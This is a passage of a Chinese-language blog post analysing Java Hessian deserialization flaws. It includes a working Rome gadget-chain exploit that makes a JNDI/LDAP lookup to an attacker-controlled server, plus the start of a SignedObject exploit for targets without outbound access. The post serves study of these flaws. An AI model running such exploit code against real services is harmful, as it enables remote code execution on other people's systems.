class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(<span class="keyword">new</span> <span class="title class_">Code</span>());</span><br><span class="line">        oser.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        ObjectInputStream unser=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        Object newobj=unser.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236138.png"                      alt="image-20230126221405110"                ><figcaption>image-20230126221405110</figcaption></figure></p><p>Hessian序列化反序列化</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessianDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        HessianOutput hessianOutput=<span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(<span class="keyword">new</span> <span class="title class_">Code</span>());</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(ser);</span><br><span class="line"></span><br><span class="line">        HessianInput hessianInput=<span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072235712.png"                      alt="image-20230126222015375"                ><figcaption>image-20230126222015375</figcaption></figure></p><blockquote><p>从运行结果中可以看出，<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，这也就直接导致JDK原生反序列化的大多数<code>gadget</code>在<code>Hessian</code>反序列化中是不能用的。</p><p>还有一个很重要的区别，<code>hessian</code>反序列化中序列化的类不需要实现序列化接口。</p></blockquote><h3 id="Hessian反序列化漏洞"><a href="#Hessian反序列化漏洞" class="headerlink" title="Hessian反序列化漏洞"></a>Hessian反序列化漏洞</h3><p>虽然<code>Hessian</code>反序列化不会自动调用反序列化类的<code>readObject</code>方法，但其也有自己的特性，当其反序列化<code>Map</code>类型的对象的时候，会自动调用其<code>put</code>方法，写个demo试试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMap</span> <span class="keyword">extends</span> <span class="title class_">HashMap</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>然后反序列化</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hessianDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        testMap tt=<span class="keyword">new</span> <span class="title class_">testMap</span>();</span><br><span class="line">        tt.put(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">        ByteArrayOutputStream ser=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(ser);</span><br><span class="line">        hessianOutput.writeObject(tt);</span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(ser.toByteArray()));</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072235097.png"                      alt="image-20230126224841023"                ><figcaption>image-20230126224841023</figcaption></figure></p><p>可以看到确实调用了<code>put</code>方法，这时看到<code>HashMap</code>的<code>put</code>方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236935.png"                      alt="image-20230130233718255"                ><figcaption>image-20230130233718255</figcaption></figure></p><p>对<code>key</code>调用<code>hash</code>方法进行处理</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236365.png"                      alt="image-20230126225301457"                ><figcaption>image-20230126225301457</figcaption></figure></p><p>只要<code>key</code>不为空，就会调用其<code>hashCode</code>方法，思路一下就打开了，之前看过的利用链中有部分就用到了<code>hashCode</code>方法，比如<code>rome</code>，又比如cc6等。</p><p>就如原生JDK有<code>ysoserial</code>，<code>Hessian</code>也有对应的工具生成<code>paylaod</code>。<a class="link"   href="https://github.com/mbechler/marshalsec" >marshalsec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>中就集成了<code>Hessian</code>反序列化的<code>gadget</code>，可以使用其生成<code>paylaod</code>，该工具中集成了5个<code>gadget</code></p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringPartiallyComparableAdvisorHolder</li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="触发点"><a href="#触发点" class="headerlink" title="触发点"></a>触发点</h3><p>由于 Hessian 会加你个序列化的结果处理成一个 Map，所有序列化的结果的 bytes 的第一个 byte 总为 M（77）,会进入这个case</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> readType();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> _serializerFactory.readMap(<span class="built_in">this</span>, type);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>跟进readMap</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, String type)</span></span><br><span class="line">    <span class="keyword">throws</span> HessianProtocolException, IOException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Deserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> getDeserializer(type);</span><br></pre></td></tr></table></figure></div><p>跟进getDeserializer，创建一个 HashMap 作为缓存，先将要反序列化的类作为 key 放入 HashMap 中</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Deserializer <span class="title function_">getDeserializer</span><span class="params">(String type)</span></span><br><span class="line">  <span class="keyword">throws</span> HessianProtocolException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (deserializer != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_cachedTypeDeserializerMap == <span class="literal">null</span>)</span><br><span class="line">      _cachedTypeDeserializerMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">      _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> deserializer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里会调用 HashMap.put 方法，结合之前分析过的 CC 链，后续调用的 hash 函数能触发任意类的 hashcode 方法。那么只需要找一条入口为 hashcode 的反序列化链即可</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rome</span><br><span class="line">XBean</span><br><span class="line">Resin</span><br><span class="line">SpringPartiallyComparableAdvisorHolder</span><br><span class="line">SpringAbstractBeanFactoryPointcutAdvisor</span><br></pre></td></tr></table></figure></div><h2 id="打Rome"><a href="#打Rome" class="headerlink" title="打Rome"></a>打Rome</h2><p>poc</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> moonflower.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_Rome</span> &#123;</span><br><span class="line"><span class="comment">//包装序列化的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//包装反序列化的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//反射设置value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//反射获取value</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用反射动态创建数组，防止在狗仔 gadget 的时候触发 put 方法导致 RCE。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.until.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>Rome的rce过程</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;</span><br><span class="line">  _cachedTypeDeserializerMap.put(type, deserializer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>进入触发点，接着调用 EqualBean 的 hashcode 方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236540.png"                      alt="image-20230124203554850"                ><figcaption>image-20230124203554850</figcaption></figure></p><p>接着会触发 ToStringBean 的 toString 方法（这里就有很多其它延申了，比如可以接一个 CC5）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236941.png"                      alt="image-20230124203614807"                ><figcaption>image-20230124203614807</figcaption></figure></p><p>接着进入 JdbcRowSetImp 的 toString 方法，在其中会调用 JdbcRowSetImp 的 getter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236500.png"                      alt="image-20230124203639615"                ><figcaption>image-20230124203639615</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236710.png"                      alt="image-20230124203654578"                ><figcaption>image-20230124203654578</figcaption></figure></p><p>当调用到 getDatabaseMetaData 的时候，会进入 connect 方法，进而调用 lookup 触发 jndi 注入。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236799.png"                      alt="image-20230124203716717"                ><figcaption>image-20230124203716717</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072236183.png"                      alt="image-20230124203736906"                ><figcaption>image-20230124203736906</figcaption></figure></p><h2 id="不出网打法（ROME）"><a href="#不出网打法（ROME）" class="headerlink" title="不出网打法（ROME）"></a>不出网打法（ROME）</h2><p><code>hessian</code>反序列化依赖<code>rome</code>的不出网利用方式</p><h4 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h4><p>在<code>java.security.SignedObject</code>中有一个<code>getObject</code>方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// creating a stream pipe-line, from b to a</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(<span class="built_in">this</span>.content);</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> a.readObject();</span><br><span class="line">    b.close();</span><br><span class="line">    a.close();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>是一个原生反序列化，那么就可以利用这里实现二次反序列化从而实现RCE。</p></blockquote><p>EXP</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> sun.security.provider.DSAPrivateKey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">romeExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] 